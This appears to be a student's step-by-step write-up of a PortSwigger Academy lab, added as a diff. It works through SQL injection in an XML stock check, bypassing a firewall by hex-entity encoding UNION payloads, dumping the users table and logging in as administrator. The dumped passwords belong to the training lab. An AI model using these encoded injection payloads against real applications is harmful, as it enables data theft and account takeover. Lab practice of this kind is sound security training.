@@ -1,0 +1,70 @@
+PortSwigger Academy Lab: SQL injection with filter bypass via XML encoding
+
+*****Context*****
+This lab contains a SQL injection vulnerability in its stock check feature. 
+The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
+The database contains a users table, which contains the usernames and passwords of registered users.
+
+Goal: Login into the website using administrator credentials
+
+*****Checking that the stock check feature sends the productId and storeId to the application in XML format.*****
+
+ATTEMPT-1
+Input: send POST request to repeater
+Output: XML data
+
+Lesson Learned: The stock check feature sends the data in XML format
+
+*****Checking if input is evaluated*****
+
+ATTEMPT-1
+Input: <storeId>1+1</storeId>
+Output: 664
+
+ATTEMPT-2
+Input: <storeId>1+2</storeId>
+Output: 994
+
+Lesson Learned: Input is being evaluated and different results are being returned for different inputs
+
+*****Determining the number of columns*****
+
+ATTEMPT-1
+Input: <storeId>1 UNION SELECT NULL</storeId>
+Output: Attack Detected
+
+Lesson Learned: request has been blocked due to being flagged as a potential attack.
+
+*****Attempting to bypass the firewall by using Hackvertor or obfusciation*****
+
+ATTEMPT-1
+Input: <@hex_entities>1 UNION SELECT NULL</@hex_entities>
+Output: null
+
+ATTEMPT-2
+Input: <@hex_entities>1 UNION SELECT NULL, NULL</@hex_entities>
+Output: null,null
+
+ATTEMPT-3
+Input: <@hex_entities>1 UNION SELECT NULL,NULL,NULL</@hex_entities>
+Output: error
+
+Lesson Learned: The number of columns is 2
+
+*****Crafting a payload to exploit the vulnerability*****
+
+ATTEMPT-1
+Input: <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
+Output: wiener~iipi35xjpvcvc9k5nse0
+        administrator~72xqiydreh15spvecx4s
+        carlos~99ur324esktk9rz0c4dk
+        344 units
+
+*****Obtaining escalated privileges by logging into the admin account******
+
+ATTEMPT-1
+Input: Username: administrator
+       Password: 72xqiydreh15spvecx4s
+Output: Welcome administrator
+
+Lesson Learned: Sensitive account credentials can be used for privilege escalation
